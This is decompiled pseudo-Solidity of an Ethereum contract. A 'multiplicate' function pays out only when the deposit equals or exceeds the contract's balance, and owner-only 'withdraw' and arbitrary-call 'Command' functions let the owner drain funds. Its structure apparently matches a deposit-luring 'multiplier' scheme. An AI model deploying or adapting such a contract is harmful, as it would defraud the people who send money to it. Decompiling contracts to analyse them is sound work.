// Decompiled by library.dedaub.com
// 2023.11.08 21:20 UTC
// Compiled using the solidity compiler version 0.4.7<=v<0.5.9


// Data structures and variables inferred from the use of storage instructions
uint256 _owner; // STORAGE[0x0] bytes 0 to 19



function () public payable { 
}

function multiplicate(address varg0) public payable { 
    if (!bool(msg.value < (address(this)).balance)) {
        v0 = varg0.call().value((address(this)).balance + msg.value).gas(!((address(this)).balance + msg.value) * 2300);
        require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    }
}

function withdraw() public payable { 
    require(bool(address(msg.sender) == _owner));
    v0 = _owner.call().value((address(this)).balance).gas(!(address(this)).balance * 2300);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
}

function Owner() public nonPayable { 
    return _owner;
}

function Command(address varg0, bytes varg1) public payable { 
    v0 = new bytes[](varg1.length);
    CALLDATACOPY(v0.data, varg1.data, varg1.length);
    require(bool(address(msg.sender) == _owner));
    v1 = v2 = 0;
    while (v1 < v0.length) {
        MEM[v3.data + v1] = v0[v1];
        v1 = v1 + 32;
    }
    v4 = v5 = v0.length + v3.data;
    if (0x1f & v0.length) {
        MEM[v5 - (0x1f & v0.length)] = ~(256 ** (32 - (0x1f & v0.length)) - 1) & MEM[v5 - (0x1f & v0.length)];
    }
    v6 = varg0.call(v3.data).value(msg.value).gas(msg.gas);
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (0x1ac9f70d == uint32(function_selector >> 224)) {
            multiplicate(address);
        } else if (0x3ccfd60b == uint32(function_selector >> 224)) {
            withdraw();
        } else if (0xb4a99a4e == uint32(function_selector >> 224)) {
            Owner();
        } else if (0xba21d62a == uint32(function_selector >> 224)) {
            Command(address,bytes);
        }
    }
    ();
}
